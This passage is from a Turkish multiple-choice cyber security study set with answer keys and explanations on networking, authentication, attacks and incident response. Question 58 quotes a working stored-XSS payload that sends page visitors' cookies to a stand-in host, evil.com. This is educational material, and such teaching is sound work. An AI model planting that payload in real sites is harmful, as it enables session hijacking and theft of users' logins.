# Cyber Security Roadmap — Çalışma Soruları
### roadmap.sh/cyber-security konularına göre hazırlanmıştır

**Toplam Soru:** 120  
**Format:** Çoktan Seçmeli (4 Şık)  
**Seviye Dağılımı:** Kolay (1–35) · Orta (36–80) · Zor (81–120)  
**Kapsam:** Networking · Authentication · Cryptography · Tools · Attacks · Incident Response · Frameworks

---

## BÖLÜM I — KOLAY (Sorular 1–35)
*Temel kavram ve tanım soruları*

---

**1.** OSI modelinde HTTP, DNS ve FTP hangi katmanda çalışır?

A) Layer 4 — Transport  
B) Layer 3 — Network  
C) Layer 7 — Application  
D) Layer 6 — Presentation  

**Doğru Cevap: C**  
**Açıklama:** HTTP, DNS, FTP, SMTP gibi kullanıcıya en yakın protokoller Layer 7 (Application) katmanında çalışır. Layer 4'te TCP/UDP, Layer 3'te IP bulunur.

---

**2.** Hangi port numarası SSH için kullanılır?

A) 21  
B) 23  
C) 80  
D) 22  

**Doğru Cevap: D**  
**Açıklama:** SSH Port 22 üzerinde çalışır. Port 21 FTP, Port 23 Telnet (şifresiz, güvensiz), Port 80 ise HTTP içindir.

---

**3.** `ping` komutunun temel amacı nedir?

A) DNS sorgularını çözmek  
B) Hedefe ulaşılabilirliği test etmek ve gecikmeyi ölçmek  
C) Açık portları taramak  
D) Ağ trafiğini yakalamak  

**Doğru Cevap: B**  
**Açıklama:** `ping`, ICMP Echo Request göndererek hedefin ulaşılabilir olup olmadığını ve ağ gecikmesini (latency) ölçer. DNS sorgusu için `nslookup` veya `dig`, port taraması için `nmap` kullanılır.

---

**4.** CIA Triad'ın üç bileşeni hangi şıkta doğru verilmiştir?

A) Confidentiality, Integrity, Availability  
B) Confidentiality, Identification, Authorization  
C) Control, Integrity, Access  
D) Cryptography, Integrity, Authentication  

**Doğru Cevap: A**  
**Açıklama:** CIA Triad: Confidentiality (Gizlilik), Integrity (Bütünlük) ve Availability (Erişilebilirlik). Bilgi güvenliğinin üç temel ilkesini oluşturur.

---

**5.** WPA, WPA2 ve WEP arasında hangisi en güvensiz olduğu için kullanılmamalıdır?

A) WPA3  
B) WPA2  
C) WPA  
D) WEP  

**Doğru Cevap: D**  
**Açıklama:** WEP 2001'de kırıldı ve artık güvensiz kabul edilir. WPA2 uzun süre standarttı; WPA3 ise en güncel ve güvenli protokoldür.

---

**6.** Aşağıdakilerden hangisi `traceroute` / `tracert` komutunun yaptığı işi doğru açıklar?

A) DNS sunucularını listeler  
B) Bir hedefe giden paketin tüm hop'larını ve gecikme sürelerini gösterir  
C) Açık portları tarar  
D) ARP tablosunu görüntüler  

**Doğru Cevap: B**  
**Açıklama:** `traceroute` / `tracert`, paketin kaynaktan hedefe giderken geçtiği her router'ı (hop) ve gecikme süresini gösterir. Ağ yavaşlığının hangi noktada oluştuğunu bulmak için kullanılır.

---

**7.** "Single Sign-On (SSO)" ne işe yarar?

A) Şifreleri otomatik oluşturur  
B) Kullanıcının bir kez giriş yaparak birden fazla uygulamaya ayrıca şifre girmeden erişmesini sağlar  
C) Ağ trafiğini şifreler  
D) Çok faktörlü doğrulama sağlar  

**Doğru Cevap: B**  
**Açıklama:** SSO (Single Sign-On), tek kimlik bilgisiyle birden fazla servise erişimi mümkün kılar. Google hesabıyla Gmail, Drive ve YouTube'a ayrı giriş yapmadan erişmek klasik örnektir.

---

**8.** Hashing işlemi hangi özelliğe sahiptir?

A) Şifrelenmiş veriyi çözebilir  
B) Tek yönlüdür; hash değerinden orijinal veriye dönmek pratik olarak imkânsızdır  
C) Şifreleme ile aynı işlevi görür  
D) Yalnızca dosya sıkıştırma için kullanılır  

**Doğru Cevap: B**  
**Açıklama:** Hash fonksiyonları tek yönlüdür. Şifreler genellikle hash olarak saklanır; böylece veritabanı ele geçirilse bile orijinal şifre doğrudan elde edilemez. Encryption ise iki yönlüdür.

---

**9.** Aşağıdakilerden hangisi bir "Packet Sniffer" aracıdır?

A) nmap  
B) Wireshark  
C) dig  
D) iptables  

**Doğru Cevap: B**  
**Açıklama:** Wireshark, ağ trafiğini gerçek zamanlı yakalayan ve protokol bazında ayrıştıran en yaygın packet sniffer aracıdır. nmap port tarayıcı, dig DNS sorgulama, iptables ise Linux güvenlik duvarı aracıdır.

---

**10.** "Phishing" saldırısının temel amacı nedir?

A) Sunucuyu çökertmek  
B) Ağ trafiğini şifrelemek  
C) Sahte e-posta veya web sitesi aracılığıyla kullanıcıyı kandırıp kimlik bilgilerini çalmak  
D) Açık portları keşfetmek  

**Doğru Cevap: C**  
**Açıklama:** Phishing, güvenilir bir kaynaktan geliyormuş gibi görünen sahte iletişimle kullanıcıları kandırarak şifre, kart numarası gibi bilgileri çalar. Social Engineering kategorisindedir.

---

**11.** `nslookup` komutu hangi amaçla kullanılır?

A) Ağ trafiğini yakalamak  
B) DNS sorgularını manuel olarak yapmak  
C) Açık portları taramak  
D) ARP tablosunu görüntülemek  

**Doğru Cevap: B**  
**Açıklama:** `nslookup`, bir alan adının IP adresini veya diğer DNS kayıtlarını (MX, NS vb.) sorgulamak için kullanılır. `dig` aracı daha ayrıntılı alternatiftir.

---

**12.** "Ransomware" nasıl çalışır?

A) Klavye girişlerini kaydeder  
B) Ağ trafiğini dinler  
C) Kurbanın dosyalarını şifreleyerek fidye talep eder  
D) Sistem log dosyalarını siler  

**Doğru Cevap: C**  
**Açıklama:** Ransomware, kurbanın verilerini şifreleyerek erişimi engeller ve şifre çözme karşılığında para ister. Düzenli yedekleme en etkili önlemdir.

---

**13.** IDS ile IPS arasındaki temel fark nedir?

A) IDS ağ tabanlı, IPS host tabanlıdır  
B) IDS tespit edip alarm üretir, IPS ise tespit edip otomatik engelleyebilir  
C) IPS daha ucuzdur  
D) İkisi aynı işlevi yapar  

**Doğru Cevap: B**  
**Açıklama:** IDS (Intrusion Detection System) pasif çalışır; alarm üretir ama müdahale etmez. IPS (Intrusion Prevention System) ise aktiftir; tehdidi tespit ettiğinde otomatik engelleyebilir.

---

**14.** `netstat` komutu ne gösterir?

A) Yönlendirme tablosunu  
B) DNS kayıtlarını  
C) Aktif ağ bağlantılarını ve dinlenen portları  
D) Ağ kartı MAC adresini  

**Doğru Cevap: C**  
**Açıklama:** `netstat`, sistemdeki aktif bağlantıları, dinlenen portları ve ağ istatistiklerini gösterir. Zararlı yazılım tespitinde beklenmedik bağlantıları keşfetmek için kullanılır.

---

**15.** "MFA (Multi-Factor Authentication)" hangi ilkeye dayanır?

A) En az ayrıcalık  
B) Birden fazla farklı kimlik doğrulama faktörü kullanma  
C) Tek parola ile tüm sistemlere erişim  
D) Biyometrik veri zorunluluğu  

**Doğru Cevap: B**  
**Açıklama:** MFA, "bildiğin" (şifre), "sahip olduğun" (telefon/token) ve "olduğun" (parmak izi) faktörlerinden birden fazlasını birleştirir. 2FA ise bu faktörlerden tam olarak ikisini kullanan alt kümededir.

---

**16.** Hangi protokol, dosya transferini şifreleyerek güvenli biçimde gerçekleştirir?

A) FTP  
B) Telnet  
C) SFTP  
D) HTTP  

**Doğru Cevap: C**  
**Açıklama:** SFTP (SSH File Transfer Protocol), dosya transferini SSH şifrelemesiyle güvenli yapar. FTP ise tüm veriyi şifresiz iletir ve üretim ortamlarında kullanılmamalıdır.

---

**17.** "Sandboxing" ne amaçla kullanılır?

A) Ağ trafiğini şifrelemek  
B) Güvenilirliği bilinmeyen yazılımı gerçek sistemden izole ortamda çalıştırmak  
C) Kullanıcı parolalarını saklamak  
D) Disk imajı almak  

**Doğru Cevap: B**  
**Açıklama:** Sandbox, şüpheli programı gerçek sisteme zarar veremeyeceği izole bir ortamda çalıştırır. Malware analizi ve şüpheli ekleri açmak için idealdir.

---

**18.** `arp` komutu hangi bilgiyi gösterir?

A) Açık portlar  
B) DNS kayıtları  
C) Yerel ağdaki IP-MAC adresi eşlemeleri  
D) Routing tablosu  

**Doğru Cevap: C**  
**Açıklama:** `arp -a` komutu, ARP önbelleğindeki IP adresi ile MAC adresi eşlemelerini listeler. ARP Poisoning saldırılarını tespit etmek için beklenmedik eşlemeler kontrol edilir.

---

**19.** "Brute Force" saldırısı nasıl çalışır?

A) Sosyal mühendislik kullanır  
B) Olası tüm kombinasyonları tek tek deneyerek şifre kırmaya çalışır  
C) DNS sunucusunu zehirler  
D) Ağ trafiğini dinler  

**Doğru Cevap: B**  
**Açıklama:** Brute Force, doğru kombinasyonu bulana kadar tüm olasılıkları dener. Güçlü ve uzun şifreler bu saldırıyı pratik olarak imkânsız kılar çünkü deneme sayısı astronomik boyuta ulaşır.

---

**20.** SSL ve TLS hakkında aşağıdakilerden hangisi doğrudur?

A) SSL daha güvenlidir  
B) TLS, SSL'in modern ve güvenli halefidir; günümüzde SSL kullanılmamalıdır  
C) İkisi birbiriyle uyumsuzdur  
D) TLS yalnızca e-posta için kullanılır  

**Doğru Cevap: B**  
**Açıklama:** SSL artık güvensiz kabul edilmekte ve kullanımı önerilmemektedir. TLS 1.2 ve TLS 1.3 günümüz standardıdır. "SSL sertifikası" terimi endüstride kullanılsa da aslında TLS sertifikası kastedilir.

---

**21.** "Dumpster Diving" saldırısı nedir?

A) Wi-Fi ağlarını araçla keşfetmek  
B) Çöpe atılan belgelerden hassas bilgi toplamak  
C) Şifresiz DNS trafiğini dinlemek  
D) Web sunucusunu çökertmek  

**Doğru Cevap: B**  
**Açıklama:** Dumpster Diving, çöpe atılan kâğıt belgeler, CD'ler veya sabit disklerden kurumsal bilgi ve şifrelere ulaşmaya çalışmaktır. Belgeler imha edilmeden çöpe atılmamalıdır.

---

**22.** `dig` komutunun `nslookup`'a göre temel avantajı nedir?

A) Daha hızlı çalışır  
B) Yalnızca Windows'ta kullanılabilir  
C) Daha ayrıntılı DNS sorgu sonuçları verir ve farklı kayıt türlerini sorgulayabilir  
D) Grafik arayüze sahiptir  

**Doğru Cevap: C**  
**Açıklama:** `dig`, A, AAAA, MX, TXT, NS, SOA gibi farklı DNS kayıt türlerini sorgulayabilir ve sorgu detaylarını tam olarak gösterir. `+trace` ile tüm DNS çözümleme zincirini de izlemek mümkündür.

---

**23.** "Vishing" nedir?

A) E-posta üzerinden yapılan kimlik avı saldırısı  
B) SMS üzerinden yapılan kimlik avı saldırısı  
C) Telefon veya VoIP üzerinden yapılan sesli kimlik avı saldırısı  
D) Wi-Fi üzerinden yapılan saldırı  

**Doğru Cevap: C**  
**Açıklama:** Vishing = Voice + Phishing. Saldırgan telefonda banka veya IT desteği gibi davranarak hassas bilgi toplar. Smishing ise SMS üzerinden, Phishing e-posta üzerinden yapılan kimlik avıdır.

---

**24.** `iptables` Linux'ta ne işe yarar?

A) DNS sorguları yapar  
B) Disk imajı alır  
C) Kernel düzeyinde ağ trafiğini kural tabanlı filtreler  
D) Ağ arayüzü bilgilerini gösterir  

**Doğru Cevap: C**  
**Açıklama:** `iptables`, Linux sistemlerde gelen (INPUT), giden (OUTPUT) ve yönlendirilen (FORWARD) ağ trafiğine kural tanımlamayı sağlayan kernel düzeyli güvenlik duvarı aracıdır.

---

**25.** "DLP (Data Loss Prevention)" sisteminin temel amacı nedir?

A) Şifreli trafiği çözmek  
B) Hassas verinin organizasyon dışına yetkisiz çıkmasını izlemek ve engellemek  
C) Ağ bant genişliğini artırmak  
D) Kullanıcıların şifrelerini yönetmek  

**Doğru Cevap: B**  
**Açıklama:** DLP, kredi kartı numaraları veya kişisel veriler gibi hassas içeriklerin e-posta, USB veya bulut yoluyla dışarı çıkmasını tespit eder ve engeller. GDPR ve HIPAA uyumu için kritiktir.

---

**26.** Aşağıdakilerden hangisi "Tailgating" saldırısını doğru tanımlar?

A) Wi-Fi şifrelerini kırmak  
B) Yetkili birinin arkasından güvenlikli alana fiziksel olarak yetkisiz girmek  
C) Hedef sistemin portlarını taramak  
D) E-posta ile zararlı link göndermek  

**Doğru Cevap: B**  
**Açıklama:** Tailgating, yetkisiz birinin yetkili kişinin arkasına takılarak fiziksel güvenlik bariyerini aşmasıdır. Kapıyı kibarca tutmak isteme gibi sosyal baskı kullanılır.

---

**27.** `tcpdump` aracının temel işlevi nedir?

A) DNS kayıtlarını güncellemek  
B) Komut satırından ağ trafiğini yakalamak ve analiz etmek  
C) Port güvenlik açıklarını taramak  
D) Firewall kurallarını yönetmek  

**Doğru Cevap: B**  
**Açıklama:** `tcpdump`, GUI olmayan sunucularda ağ trafiğini yakalamak için kullanılan komut satırı aracıdır. Wireshark'ın terminal tabanlı halidir; pcap formatında kaydedilen trafik daha sonra Wireshark ile analiz edilebilir.

---

**28.** "Zero Trust" modelinin temel ilkesi nedir?

A) İç ağdaki tüm cihazlar güvenilirdir  
B) Yalnızca VPN kullanıcıları güvenilirdir  
C) Asla güvenme, her erişimi konumdan bağımsız sürekli doğrula  
D) Fiziksel güvenlik en önemli katmandır  

**Doğru Cevap: C**  
**Açıklama:** Zero Trust, "iç ağdaysan güvenilirsin" anlayışını reddeder. Ağ içinde veya dışında fark etmeksizin her erişim doğrulanır, yetkilendirilir ve sürekli izlenir.

---

**29.** DNSSEC'in temel amacı nedir?

A) DNS sorgularını şifrelemek  
B) DNS yanıtlarının dijital imzayla doğrulanmasını sağlamak  
C) DNS sunucusunun hızını artırmak  
D) Alan adı kayıtlarını yönetmek  

**Doğru Cevap: B**  
**Açıklama:** DNSSEC, DNS yanıtlarını dijital imzayla doğrular; yanıtın kaynaktan değiştirilmeden geldiğini kanıtlar. DNS Poisoning saldırılarına karşı temel savunmadır. Ancak şifreleme değil, bütünlük/özgünlük sağlar.

---

**30.** "Shoulder Surfing" nedir?

A) Omuzdan yük taşıma tekniği  
B) Şifre girilirken fiziksel olarak yakında durarak bilgiyi görsel yoldan ele geçirmek  
C) Ağ üzerinden veri çalmak  
D) Sisteme arka kapıdan girmek  

**Doğru Cevap: B**  
**Açıklama:** Shoulder Surfing, ATM veya bilgisayar başında şifre girerken birinin arkada durarak PIN veya şifreyi izlemesidir. Privacy screen (gizlilik filtresi) bu tehdide karşı fiziksel bir önlemdir.

---

**31.** EDR (Endpoint Detection and Response) geleneksel antivirüsten nasıl ayrışır?

A) EDR yalnızca virüs imzalarını tarar  
B) EDR uç noktaları sürekli izler, tehditleri tespit eder, yanıt verir ve forensic analiz imkânı sunar  
C) EDR yalnızca ağ trafiğini izler  
D) EDR şifre yönetimi yapar  

**Doğru Cevap: B**  
**Açıklama:** Antivirüs imza tabanlı çalışır ve bilinen tehditleri yakalar. EDR ise süreç aktivitesi, dosya değişiklikleri ve ağ bağlantılarını sürekli kaydederek bilinmeyen tehditleri de davranışsal analiz ile tespit eder.

---

**32.** "Spam" ve "Spim" arasındaki fark nedir?

A) Spam daha tehlikelidir  
B) Spam e-posta üzerinden, Spim anlık mesajlaşma üzerinden gönderilen istenmeyen mesajdır  
C) Spim yalnızca virüs içerir  
D) İkisi aynı kavramdır  

**Doğru Cevap: B**  
**Açıklama:** Spam, e-posta kanalındaki istenmeyen toplu mesajdır. Spim (Spam over Instant Messaging) ise aynı konseptin WhatsApp, Slack gibi anlık mesajlaşma platformlarındaki versiyonudur.

---

**33.** `nmap` aracının temel işlevi nedir?

A) DNS önbelleğini temizlemek  
B) Ağ trafiğini şifrelemek  
C) Ağdaki cihazları, açık portları ve çalışan servisleri tespit etmek  
D) Firewall kurallarını yapılandırmak  

**Doğru Cevap: C**  
**Açıklama:** nmap, ağ keşfi ve güvenlik taraması için kullanılan en yaygın araçtır. Port taraması, servis/sürüm tespiti ve OS fingerprinting yapabilir. İzinsiz kullanımı yasaldışıdır.

---

**34.** "Defense in Depth" ilkesi hangi yaklaşımı ifade eder?

A) Yalnızca en güçlü firewall kullanmak  
B) Tüm verinin şifrelenmesi  
C) Birden fazla güvenlik katmanı kullanarak tek katman başarısız olduğunda diğerlerinin devreye girmesi  
D) Yalnızca fiziksel güvenliğe odaklanmak  

**Doğru Cevap: C**  
**Açıklama:** Defense in Depth, soğan gibi katmanlı bir güvenlik mimarisini ifade eder. Firewall, IDS/IPS, encryption, access control ve fiziksel güvenlik bir arada kullanılır; bir katman kırılırsa diğerleri korumaya devam eder.

---

**35.** `ipconfig` komutu hangi işletim sistemine aittir ve ne yapar?

A) Linux; ağ trafiğini yakalar  
B) Windows; ağ arayüzünün IP adresi, Subnet Mask ve Gateway bilgilerini gösterir  
C) macOS; firewall kurallarını listeler  
D) Linux; DNS sorgularını yapar  

**Doğru Cevap: B**  
**Açıklama:** `ipconfig` Windows'a özgüdür; ağ arayüzü bilgilerini (IP, Subnet Mask, Default Gateway, MAC adresi) gösterir. Linux/macOS karşılığı `ifconfig` veya `ip addr`'dir. `ipconfig /flushdns` DNS önbelleğini temizler.

---

## BÖLÜM II — ORTA (Sorular 36–80)
*Karşılaştırma, senaryo analizi ve kavramsal bağlantı soruları*

---

**36.** Kerberos kimlik doğrulama sisteminin temel avantajı nedir?

A) Şifreleri ağ üzerinden şifreli gönderir  
B) Her servise ayrı şifre girişi gerektirir  
C) Kullanıcı şifresini ağ üzerinden hiç göndermeden bilet tabanlı SSO sağlar  
D) Yalnızca Linux sistemlerde çalışır  

**Doğru Cevap: C**  
**Açıklama:** Kerberos'ta kullanıcı bir kez kimliğini doğrular ve TGT (Ticket Granting Ticket) alır. Bu biletle şifresi sorulmadan diğer ağ servislerine erişebilir. Active Directory ortamlarının temel kimlik doğrulama protokolüdür.

---

**37.** RADIUS protokolü hangi senaryoda kullanılır?

A) Disk imajı almak için  
B) VPN ve Wi-Fi girişlerinde kimlik doğrulamayı merkezi olarak yönetmek için  
C) Web sunucusu trafiğini şifrelemek için  
D) DNS kayıtlarını çözmek için  

**Doğru Cevap: B**  
**Açıklama:** RADIUS, AAA (Authentication, Authorization, Accounting) protokolüdür. Kurumsal Wi-Fi (WPA2 Enterprise), VPN ve ağ cihazı girişlerinde merkezi kimlik doğrulama sağlar. Her kullanıcı için ayrı yerel hesap açmak yerine tek merkezi sunucudan yönetim yapılır.

---

**38.** "Salting" neden hash güvenliğini artırır?

A) Hash algoritmasını daha karmaşık hale getirir  
B) Her şifreye özgü rastgele değer ekleyerek aynı şifrelerin farklı hash üretmesini sağlar ve Rainbow Table saldırılarını etkisiz kılar  
C) Şifrelerin uzunluğunu artırır  
D) Hash işlemini tersine çevirebilir hale getirir  

**Doğru Cevap: B**  
**Açıklama:** Salt, her kullanıcının şifresine eklenen benzersiz rastgele değerdir. İki kullanıcı aynı şifreyi kullansa bile salt farklı olduğu için hash değerleri farklıdır. Bu durum önceden hesaplanmış Rainbow Table saldırılarını tamamen geçersiz kılar.

---

**39.** LDAP ve LDAPS arasındaki fark nedir?

A) LDAPS daha yavaştır  
B) LDAP şifresiz çalışır; LDAPS aynı işlemi TLS şifrelemesiyle yapar  
C) LDAPS yalnızca Linux'ta kullanılır  
D) Aralarında işlevsel fark yoktur  

**Doğru Cevap: B**  
**Açıklama:** LDAP (Port 389) tüm sorguları plaintext iletir. LDAPS (Port 636) ise aynı işlemi TLS şifrelemesiyle yapar. Kurumsal Active Directory trafiğinin güvenli olması için LDAPS tercih edilmelidir.

---

**40.** Aşağıdaki senaryoda hangi saldırı gerçekleşmektedir?
*"Saldırgan, kurbanın normal olarak ziyaret ettiği bir endüstri forumunu ele geçirip zararlı kod yerleştiriyor. Forum üyesi konu başarıyla ziyaret ettiğinde sistemi ele geçiriliyor."*

A) Phishing  
B) Watering Hole Attack  
C) SQL Injection  
D) Typo Squatting  

**Doğru Cevap: B**  
**Açıklama:** Watering Hole saldırısında doğrudan hedefi değil, hedefin güvendiği web sitesi ele geçirilir. Kurban güvendiği siteye gittiğinde sistemi etkilenir. Güvenlik bilinci yüksek kişileri bile kandırabilir.

---

**41.** "PKI (Public Key Infrastructure)" içinde CA'nın rolü nedir?

A) Kullanıcı şifrelerini saklar  
B) Ağ trafiğini filtreler  
C) Digital sertifikaları imzalamak ve geçerliliğini onaylamak  
D) Şifreleme anahtarlarını üretir  

**Doğru Cevap: C**  
**Açıklama:** CA (Certificate Authority), digital sertifikaları imzalayarak kimlik doğrulaması yapar. Tarayıcıdaki kilit simgesi, sunucunun güvenilir bir CA tarafından imzalanmış sertifikasına sahip olduğunu gösterir.

---

**42.** `dd` komutu adli bilişimde neden kullanılır?

A) DNS sorgularını loglar  
B) Diskin bit-bit imajını alarak orijinal delillere dokunmadan kopya oluşturur  
C) Ağ trafiğini yakalar  
D) Kullanıcı oturumlarını izler  

**Doğru Cevap: B**  
**Açıklama:** Adli bilişimde orijinal diske yazılması delilleri bozabilir. `dd` ile bit-bit birebir kopya alınır, ardından hash değeri (MD5/SHA) hesaplanarak kopyanın orijinalle aynı olduğu kanıtlanır.

---

**43.** Aşağıdaki senaryoda hangi kavram ihlal edilmektedir?
*"Bir çalışan, işten ayrılmasına rağmen eski şirkete ait sisteme giriş yapmaya devam ediyor."*

A) Confidentiality  
B) Integrity  
C) Access Management — Revocation (hesap iptali yapılmamış)  
D) Non-Repudiation  

**Doğru Cevap: C**  
**Açıklama:** Access Management'ın dört görevi: account administration, maintenance, monitoring ve revocation'dır. Çalışan ayrıldığında hesabın derhal iptal edilmesi (revocation) zorunludur. Bu ihlal aynı zamanda Confidentiality riskini de taşır.

---

**44.** "DoS" ile "DDoS" arasındaki temel fark nedir?

A) DDoS daha az etkilidir  
B) DoS tek kaynaktan, DDoS ise botnet gibi çok sayıda dağıtık kaynaktan aynı anda gerçekleştirilir  
C) DoS yalnızca ağ cihazlarını hedef alır  
D) DDoS şifreleme kullanır  

**Doğru Cevap: B**  
**Açıklama:** DoS tek kaynaktan gelir ve kaynak engellenerek durdurulabilir. DDoS'ta kaynak binlerce farklı IP'den oluştuğundan durdurmak çok daha güçtür. Botnet'ler DDoS saldırılarının temel altyapısıdır.

---

**45.** `grep` komutu Incident Response sürecinde neden kritiktir?

A) Ağ trafiğini yakalar  
B) Büyük log dosyalarında belirli IP, kullanıcı adı veya hata kodu gibi desenleri hızlı aramak için  
C) Firewall kurallarını listeler  
D) Disk imajı alır  

**Doğru Cevap: B**  
**Açıklama:** Bir güvenlik olayında GB boyutundaki log dosyasını elle okumak imkânsızdır. `grep "Failed password" /var/log/auth.log` gibi komutlarla iğneyi samanlıkta bulmak mümkün hale gelir.

---

**46.** "Typo Squatting" saldırısı nasıl çalışır?

A) DNS sunucusuna sahte kayıt eklenir  
B) Meşru sitenin yazım yanlışı içeren benzer alan adları kaydedilerek yanlış yazan kullanıcılar tuzağa çekilir  
C) Ağ trafiği araya girilerek değiştirilir  
D) Kullanıcıya sahte e-posta gönderilir  

**Doğru Cevap: B**  
**Açıklama:** "g00gle.com" veya "gooogle.com" gibi alan adları kaydeden saldırganlar, yazım hatası yapan kullanıcıları sahte siteye yönlendirir. Credential harvesting veya malware dağıtımı için kullanılır.

---

**47.** "Obfuscation" ile "Encryption" arasındaki fark nedir?

A) İkisi aynı işlevi görür  
B) Obfuscation kodu karmaşıklaştırır ama gerçek gizlilik sağlamaz; Encryption matematiksel olarak veriyi korur  
C) Encryption daha hızlıdır  
D) Obfuscation yalnızca görüntü dosyalarına uygulanır  

**Doğru Cevap: B**  
**Açıklama:** Obfuscation, kodu anlaşılması güç hale getirir; yeterli çaba ile çözülebilir ve gerçek güvenlik sağlamaz. Encryption ise matematiksel olarak doğru anahtarsız çözülemez güvenlik sunar.

---

**48.** Aşağıdaki senaryoda hangi saldırı türü gerçekleşmektedir?
*"Bir kullanıcı, ortak Wi-Fi'ye bağlandığında tüm trafiği gerçek ağ gibi görünen sahte bir erişim noktasından geçiyor."*

A) Deauth Attack  
B) VLAN Hopping  
C) Evil Twin  
D) DNS Poisoning  

**Doğru Cevap: C**  
**Açıklama:** Evil Twin, meşru Wi-Fi ağının adını (SSID) taklit eden sahte erişim noktasıdır. Kurban bağlandığında tüm trafik saldırganın üzerinden geçer (MitM). Havalimanı, kafe gibi kamuya açık alanlarda yaygındır.

---

**49.** SRTP protokolü hangi amaçla kullanılır?

A) Web trafiğini şifrelemek  
B) DNS sorgularını güvenli yapmak  
C) VoIP ve video konferans gibi gerçek zamanlı medya akışlarını şifrelemek  
D) E-posta iletimini güvenli yapmak  

**Doğru Cevap: C**  
**Açıklama:** SRTP (Secure Real-Time Transport Protocol), ses ve video gibi gerçek zamanlı medya için şifreleme, bütünlük ve replay attack koruması sağlar. Şifrelenmemiş RTP trafiği kolayca dinlenebilir.

---

**50.** "Incident Handling" sürecinin altı adımı doğru sırayla hangisinde verilmiştir?

A) Identification → Preparation → Containment → Eradication → Recovery → Lessons Learned  
B) Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned  
C) Containment → Preparation → Identification → Recovery → Eradication → Lessons Learned  
D) Preparation → Containment → Identification → Recovery → Eradication → Lessons Learned  

**Doğru Cevap: B**  
**Açıklama:** Hazırlık önce yapılır (Preparation), olay tespit edilir (Identification), yayılma durdurulur (Containment), temizlenir (Eradication), normale dönülür (Recovery) ve dersler çıkarılır (Lessons Learned).

---

**51.** "CSRF (Cross-Site Request Forgery)" saldırısı nasıl çalışır?

A) Saldırgan veritabanına SQL kodu enjekte eder  
B) Kimliği doğrulanmış kullanıcının tarayıcısı, habersizce kötü niyetli istekler göndermek için kullanılır  
C) DNS önbelleği zehirlenir  
D) Şifre dosyası kopyalanır  

**Doğru Cevap: B**  
**Açıklama:** CSRF'de saldırgan kurbanın aktif oturumunu kullanır. Banka oturumu açık olan kurban bir forum sayfasını ziyaret ettiğinde, forum sayfası gizlice banka hesabından işlem yapabilir. CSRF Token savunmanın temelidir.

---

**52.** `tail -f` komutu bir güvenlik olayında neden kullanışlıdır?

A) Disk imajı alır  
B) Log dosyasının son satırlarını gerçek zamanlı olarak takip etmeyi sağlar  
C) Ağ trafiğini yakalar  
D) Hash değeri hesaplar  

**Doğru Cevap: B**  
**Açıklama:** `tail -f /var/log/auth.log` komutu, log dosyasına yeni satır eklendikçe anında ekranda gösterir. Bir saldırı esnasında canlı olarak ne olduğunu izlemek için kritiktir.

---

**53.** S/MIME protokolü hangi güvenlik hizmetlerini e-postaya ekler?

A) Yalnızca şifreleme  
B) Yalnızca dijital imza  
C) Hem dijital imza (kimlik doğrulama) hem şifreleme (gizlilik)  
D) Spam filtreleme  

**Doğru Cevap: C**  
**Açıklama:** S/MIME, e-postaya iki hizmet ekler: Digital Signature (göndericinin kimliğini ve içeriğin değişmediğini kanıtlar) ve Encryption (içeriği yalnızca alıcının okuyabileceği şekilde şifreler). PKI altyapısına dayanır.

---

**54.** "Pass the Hash" saldırısı neden tehlikelidir?

A) Şifreli verileri çözer  
B) Saldırgan, şifreyi bilmeden hash değerini doğrudan kimlik doğrulama için kullanabilir  
C) Ağ bant genişliğini tüketir  
D) DNS kayıtlarını manipüle eder  

**Doğru Cevap: B**  
**Açıklama:** Windows NTLM kimlik doğrulamasında şifrenin hash değeri yeterlidir. Saldırgan ele geçirdiği hash ile şifreyi kırmak zorunda kalmadan lateral movement yapabilir. Mimikatz bu tekniği kolaylaştırır.

---

**55.** "Honeypot" kullanmanın birincil güvenlik amacı nedir?

A) Sistem performansını artırmak  
B) Saldırganları sahte hedefle tuzağa çekerek gerçek sistemleri korumak ve saldırı tekniklerini analiz etmek  
C) Yedek veri saklamak  
D) VPN bağlantılarını yönetmek  

**Doğru Cevap: B**  
**Açıklama:** Honeypot, cazip görünen sahte sistemdir. Saldırganı gerçek sistemlerden uzak tutar, saldırı tekniklerini ifşa eder ve erken uyarı sağlar. Doğru yapılandırılmazsa saldırgana gerçek ağa sıçrama taşı olabilir.

---

**56.** "Buffer Overflow" saldırısında saldırganın nihai hedefi nedir?

A) Ağ trafiğini dinlemek  
B) DNS kayıtlarını değiştirmek  
C) Programın bellek taşmasından yararlanarak kendi kodunu çalıştırmak  
D) Kullanıcı parolalarını ele geçirmek  

**Doğru Cevap: C**  
**Açıklama:** Buffer Overflow'da programa kaldırabileceğinden fazla veri gönderilir; taşan veri komşu bellek bölgelerini bozar. Saldırgan bu veriyi özenle tasarlarsa programın return address'ini değiştirip kendi shell kodunu çalıştırabilir.

---

**57.** `hping` aracı standart `ping`'den nasıl farklıdır?

A) Yalnızca Windows'ta çalışır  
B) Özelleştirilmiş TCP, UDP veya ICMP paketleri oluşturarak gönderebilir; firewall test ve DDoS simülasyonunda kullanılır  
C) Yalnızca DNS sorguları yapar  
D) Grafik arayüz sunar  

**Doğru Cevap: B**  
**Açıklama:** `hping`, standart ping'den çok daha gelişmiştir; belirli flag kombinasyonlarıyla özel paketler üretebilir. Firewall kural testi, OS fingerprinting ve DDoS simülasyonu için kullanılır.

---

**58.** Aşağıdaki senaryoda hangi saldırı gerçekleşmektedir?
*"Bir forum sitesine `<script>document.location='http://evil.com/?c='+document.cookie</script>` içeren yorum ekleniyor. Sayfayı açan herkesin cookie'si çalınıyor."*

A) SQL Injection  
B) CSRF  
C) Stored XSS (Cross-Site Scripting)  
D) Buffer Overflow  

**Doğru Cevap: C**  
**Açıklama:** Bu Stored XSS örneğidir. Zararlı JavaScript veritabanına kaydedilir; sayfayı açan her kullanıcının tarayıcısında çalışarak cookie'leri saldırgana gönderir. Session Hijacking için kullanılabilir.

---

**59.** "Replay Attack" nasıl önlenir?

A) Güçlü şifre politikası uygulanır  
B) Timestamp, nonce (tek kullanımlık değer) veya session token rotasyonu kullanılır  
C) Ağ trafiği şifrelenir  
D) Firewall kuralı güncellenir  

**Doğru Cevap: B**  
**Açıklama:** Replay Attack'ta yakalanmış geçerli paket tekrar gönderilir. Timestamp (belirli süre sonra geçersiz) veya nonce (tek kullanımlık rastgele değer) kullanılarak aynı paketin tekrar kabul edilmesi önlenir.

---

**60.** "Directory Traversal" saldırısının hedefi nedir?

A) Şifrelerin kırılması  
B) Web uygulamasının dosya sisteminde `../` gibi yol karakterleri kullanarak kısıtlı dizinlere erişmek  
C) DNS önbelleğini zehirlemek  
D) Ağ trafiğini izlemek  

**Doğru Cevap: B**  
